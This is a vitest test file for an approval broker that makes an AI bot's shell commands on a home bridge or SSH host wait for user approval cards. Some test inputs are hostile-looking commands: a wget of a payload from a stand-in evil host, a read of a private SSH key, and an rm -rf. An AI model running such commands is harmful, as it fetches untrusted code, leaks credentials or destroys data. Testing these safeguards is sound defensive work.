// Home-bridge / SSH execution is a trust boundary: a missing scoped grant
// must raise a real pending card, never a 403 that pretends a card was shown.
// These tests pin the broker's lifecycle — creation, join/dedup, fingerprint
// binding, expiry, approve-once, always-allow program scope, auto-mode denial,
// and the decision log — so a later shortcut cannot put the lie back.
import { rmSync } from "node:fs";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { approvalKey } from "./auto-approve.ts";
import {
  cancelBridgeApprovalsFor,
  cancelBridgeApprovalsForThread,
  dismissStaleBridgeCards,
  requestBridgeApproval,
  resetBridgeApprovalsForTests,
  resolveBridgeApproval,
  type ApprovalBus,
} from "./bridge-approval.ts";
import { DATA_DIR } from "./config.ts";
import type { ModelSelection } from "./contracts.ts";
import { appendDecision, flushDecisionLog, readDecisions } from "./decision-log.ts";
import { closeMessageDb } from "./message-db.ts";
import { Store, type BotRecord } from "./store.ts";

const selection = (): ModelSelection => ({ instanceId: "claude", model: "fake-model" });

function pendingCard(store: Store, bot: BotRecord) {
  return store
    .messagesFor(bot.threadId)
    .find((m) => m.kind === "options" && m.card?.requestId && !m.card.answered && !m.card.dismissed);
}

function pendingCards(store: Store, bot: BotRecord) {
  return store
    .messagesFor(bot.threadId)
    .filter((m) => m.kind === "options" && m.card?.requestId && !m.card.answered && !m.card.dismissed);
}

async function decisions() {
  await flushDecisionLog(DATA_DIR);
  return readDecisions(DATA_DIR, 200);
}

describe("bridge approval card lifecycle", () => {
  let store: Store;
  let bus: ApprovalBus;
  let bot: BotRecord;

  beforeEach(() => {
    resetBridgeApprovalsForTests();
    store = new Store(selection);
    bot = store.patchBot(store.createBot().id, { name: "Worker" })!;
    bus = { store, broadcast: () => {} };
  });

  afterEach(() => {
    resetBridgeApprovalsForTests();
    closeMessageDb();
    rmSync(DATA_DIR, { recursive: true, force: true });
  });

  it("creates a real pending card with a narrow program allowKey instead of a fake card-shown 403", async () => {
    const verdict = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
    });
    const card = pendingCard(store, bot);
    expect(card).toBeTruthy();
    expect(card!.card!.tool).toBe("run_on_bridge");
    expect(card!.card!.allowKey).toBe("bridge:run_on_bridge:echo");
    expect(card!.card!.allowKey).toBe(approvalKey("run_on_bridge", "echo hi", "bridge"));
    expect(card!.card!.options).toEqual(["Allow", "Deny", "Always allow"]);
    expect(card!.card!.subtitle).toBe("echo hi");

    expect(resolveBridgeApproval(bus, card!.card!.requestId!, "allow")).toBe(true);
    expect(await verdict).toBe("allow");
    expect(pendingCard(store, bot)).toBeUndefined();
  });

  it("puts the card on the bot thread so the existing phone always-allow path can see it", async () => {
    const verdict = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_ssh_target",
      command: "uptime",
      target: "nas",
      logThreadId: "some-other-thread",
    });
    const card = pendingCard(store, bot);
    expect(card).toBeTruthy();
    expect(card!.card!.tool).toBe("run_on_ssh_target");
    expect(card!.card!.allowKey).toBe("bridge:run_on_ssh_target:uptime");
    expect(store.messagesFor("some-other-thread")).toHaveLength(0);

    const pendingGrant = store.messagesFor(bot.threadId).some(
      (message) =>
        message.card?.requestId &&
        !message.card.answered &&
        message.card.dismissed !== true &&
        message.card.allowKey === card!.card!.allowKey,
    );
    expect(pendingGrant).toBe(true);

    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toBe("deny");
  });

  it("joins a retried identical request onto the same card and does not show a second one", async () => {
    const first = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
      cwd: "/tmp",
    });
    const second = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
      cwd: "/tmp",
    });
    expect(pendingCards(store, bot)).toHaveLength(1);
    const card = pendingCard(store, bot)!;
    expect(resolveBridgeApproval(bus, card.card!.requestId!, "allow")).toBe(true);
    expect(await first).toBe("allow");
    expect(await second).toBe("allow");
    expect(pendingCard(store, bot)).toBeUndefined();

    const rows = await decisions();
    expect(rows.filter((r) => r.decision === "card-shown" && r.botId === bot.id)).toHaveLength(1);
  });

  it("does not let an approval for one payload settle a tampered or mismatched request", async () => {
    const echo = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
    });
    const wget = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "wget https://evil.example/payload",
      target: "mini",
    });
    const otherBridge = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "other-mini",
    });
    const cards = pendingCards(store, bot);
    expect(cards).toHaveLength(3);

    const echoCard = cards.find((m) => m.card?.subtitle === "echo hi" && m.card.title.includes("mini") && !m.card.title.includes("other"))
      ?? cards.find((m) => m.card?.allowKey === "bridge:run_on_bridge:echo" && m.card.subtitle === "echo hi" && !m.card.title.includes("other"));
    expect(echoCard).toBeTruthy();
    expect(resolveBridgeApproval(bus, echoCard!.card!.requestId!, "allow")).toBe(true);
    expect(await echo).toBe("allow");

    expect(pendingCards(store, bot)).toHaveLength(2);
    const wgetStill = pendingCards(store, bot).find((m) => m.card?.subtitle.includes("wget"));
    expect(wgetStill).toBeTruthy();
    expect(wgetStill!.card!.requestId).not.toBe(echoCard!.card!.requestId);

    cancelBridgeApprovalsFor(bot.id);
    expect(await wget).toBe("deny");
    expect(await otherBridge).toBe("deny");
  });

  it("denies an Allow that arrives after the pending grant has expired", async () => {
    const verdict = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
      timeoutMs: 20,
    });
    const card = pendingCard(store, bot)!;
    expect(await verdict).toBe("deny");
    expect(store.messagesFor(bot.threadId).find((m) => m.id === card.id)?.card?.answered).toBe("deny");

    expect(resolveBridgeApproval(bus, card.card!.requestId!, "allow")).toBe(true);
    const rows = await decisions();
    expect(rows.some((r) => r.requestId === card.card!.requestId && r.decision === "user-approved")).toBe(false);
  });

  it("consumes approve-once so the next identical request needs a new card", async () => {
    const first = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
    });
    const firstCard = pendingCard(store, bot)!;
    expect(resolveBridgeApproval(bus, firstCard.card!.requestId!, "allow")).toBe(true);
    expect(await first).toBe("allow");
    expect(pendingCard(store, bot)).toBeUndefined();

    const second = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
    });
    const secondCard = pendingCard(store, bot);
    expect(secondCard).toBeTruthy();
    expect(secondCard!.card!.requestId).not.toBe(firstCard.card!.requestId);
    expect(resolveBridgeApproval(bus, firstCard.card!.requestId!, "allow")).toBe(true);
    expect(pendingCard(store, bot)?.id).toBe(secondCard!.id);

    cancelBridgeApprovalsFor(bot.id);
    await expect(second).resolves.toBe("deny");
  });

  it("honours a scoped always-allow grant without a card, and does not widen it to another program", async () => {
    store.patchBot(bot.id, { alwaysAllow: [approvalKey("run_on_bridge", "echo hi", "bridge")] });
    const live = store.bot(bot.id)!;

    await expect(
      requestBridgeApproval(bus, { bot: live, tool: "run_on_bridge", command: "echo hi", target: "mini" }),
    ).resolves.toBe("allow");
    expect(pendingCard(store, live)).toBeUndefined();

    await expect(
      requestBridgeApproval(bus, { bot: live, tool: "run_on_bridge", command: "echo bye", target: "mini" }),
    ).resolves.toBe("allow");
    expect(pendingCard(store, live)).toBeUndefined();

    const wget = requestBridgeApproval(bus, {
      bot: live,
      tool: "run_on_bridge",
      command: "wget https://example.com",
      target: "mini",
    });
    const card = pendingCard(store, live);
    expect(card).toBeTruthy();
    expect(card!.card!.allowKey).toBe("bridge:run_on_bridge:wget");
    cancelBridgeApprovalsFor(live.id);
    await expect(wget).resolves.toBe("deny");
  });

  it("does not let auto mode inherit a bridge approval", async () => {
    store.patchBot(bot.id, { autoApprove: true });
    const live = store.bot(bot.id)!;
    const verdict = requestBridgeApproval(bus, {
      bot: live,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
    });
    const card = pendingCard(store, live);
    expect(card).toBeTruthy();
    cancelBridgeApprovalsFor(live.id);
    await expect(verdict).resolves.toBe("deny");
  });

  it("keeps destructive and sensitive commands fail-closed for grants, with no Always allow", async () => {
    store.patchBot(bot.id, {
      autoApprove: true,
      alwaysAllow: [approvalKey("run_on_bridge", "rm -rf /tmp/build", "bridge")],
    });
    const live = store.bot(bot.id)!;
    const destructive = requestBridgeApproval(bus, {
      bot: live,
      tool: "run_on_bridge",
      command: "rm -rf /tmp/build",
      target: "mini",
    });
    const card = pendingCard(store, live);
    expect(card).toBeTruthy();
    expect(card!.card!.options).toEqual(["Allow", "Deny"]);
    expect(card!.card!.allowKey).toBeUndefined();

    expect(resolveBridgeApproval(bus, card!.card!.requestId!, "allow")).toBe(true);
    expect(await destructive).toBe("allow");

    const sensitive = requestBridgeApproval(bus, {
      bot: live,
      tool: "run_on_bridge",
      command: "cat ~/.ssh/id_ed25519",
      target: "mini",
    });
    const sensitiveCard = pendingCard(store, live);
    expect(sensitiveCard).toBeTruthy();
    expect(sensitiveCard!.card!.options).toEqual(["Allow", "Deny"]);
    expect(sensitiveCard!.card!.allowKey).toBeUndefined();
    cancelBridgeApprovalsFor(live.id);
    await expect(sensitive).resolves.toBe("deny");
  });

  it("logs card-shown only when a card exists, then user-approved / user-denied accurately", async () => {
    const allow = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
      logThreadId: bot.threadId,
    });
    const allowCard = pendingCard(store, bot)!;
    let rows = await decisions();
    const shown = rows.filter((r) => r.decision === "card-shown" && r.requestId === allowCard.card!.requestId);
    expect(shown).toHaveLength(1);
    expect(shown[0]!.source).toBe("no-grant");
    expect(shown[0]!.tool).toBe("run_on_bridge");
    expect(shown[0]!.summary).toBe("echo hi");
    expect(store.messagesFor(bot.threadId).some((m) => m.card?.requestId === allowCard.card!.requestId)).toBe(true);

    expect(resolveBridgeApproval(bus, allowCard.card!.requestId!, "allow")).toBe(true);
    expect(await allow).toBe("allow");
    rows = await decisions();
    const approved = rows.filter((r) => r.decision === "user-approved" && r.requestId === allowCard.card!.requestId);
    expect(approved).toHaveLength(1);
    expect(approved[0]!.source).toBe("user");

    const deny = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "ls /tmp",
      target: "mini",
    });
    const denyCard = pendingCard(store, bot)!;
    expect(resolveBridgeApproval(bus, denyCard.card!.requestId!, "deny")).toBe(true);
    expect(await deny).toBe("deny");
    rows = await decisions();
    expect(rows.some((r) => r.decision === "user-denied" && r.requestId === denyCard.card!.requestId)).toBe(true);
  });

  it("logs auto-approved for a real always-allow grant and never a fake card-shown", async () => {
    store.patchBot(bot.id, { alwaysAllow: [approvalKey("run_on_bridge", "echo hi", "bridge")] });
    const live = store.bot(bot.id)!;
    await expect(
      requestBridgeApproval(bus, { bot: live, tool: "run_on_bridge", command: "echo hi", target: "mini" }),
    ).resolves.toBe("allow");
    expect(pendingCard(store, live)).toBeUndefined();
    const rows = await decisions();
    const auto = rows.filter((r) => r.botId === live.id && r.decision === "auto-approved");
    expect(auto).toHaveLength(1);
    expect(auto[0]!.source).toBe("always-allow");
    expect(auto[0]!.rule).toBe("bridge:run_on_bridge:echo");
    expect(rows.some((r) => r.botId === live.id && r.decision === "card-shown")).toBe(false);
  });

  it("does not log card-shown when a request is refused without creating a card", async () => {
    appendDecision(DATA_DIR, {
      threadId: "unrelated",
      botId: "other",
      tool: "run_on_bridge",
      summary: "should not be confused with a missing-card 403",
      decision: "auto-approved",
      source: "always-allow",
    });
    const rows = await decisions();
    expect(rows.some((r) => r.decision === "card-shown")).toBe(false);
    expect(pendingCard(store, bot)).toBeUndefined();
  });

  it("answers an unknown requestId as not-ours, so provider cards still route", () => {
    expect(resolveBridgeApproval(bus, "not-a-bridge-request", "allow")).toBe(false);
  });

  it("denies and settles when the bot is deleted or its thread is interrupted", async () => {
    const verdict = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
    });
    const card = pendingCard(store, bot)!;
    cancelBridgeApprovalsForThread(bot.threadId);
    expect(await verdict).toBe("deny");
    expect(store.messagesFor(bot.threadId).find((m) => m.id === card.id)?.card?.dismissed).toBe(true);
  });

  it("dismisses cards left by a previous run, which nothing can answer", () => {
    const orphan = store.appendMessage(bot.threadId, {
      role: "bot",
      kind: "options",
      card: {
        title: "@Worker wants to run on mini",
        subtitle: "echo hi",
        options: ["Allow", "Deny", "Always allow"],
        requestId: "from-a-dead-process",
        tool: "run_on_bridge",
        allowKey: "bridge:run_on_bridge:echo",
      },
    });
    expect(dismissStaleBridgeCards(bus)).toBe(1);
    expect(store.messagesFor(bot.threadId).find((m) => m.id === orphan.id)?.card?.dismissed).toBe(true);
    expect(dismissStaleBridgeCards(bus)).toBe(0);
  });

  it("leaves a live card alone at boot", async () => {
    const verdict = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_bridge",
      command: "echo hi",
      target: "mini",
    });
    expect(pendingCard(store, bot)).toBeTruthy();
    expect(dismissStaleBridgeCards(bus)).toBe(0);
    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toBe("deny");
  });
});
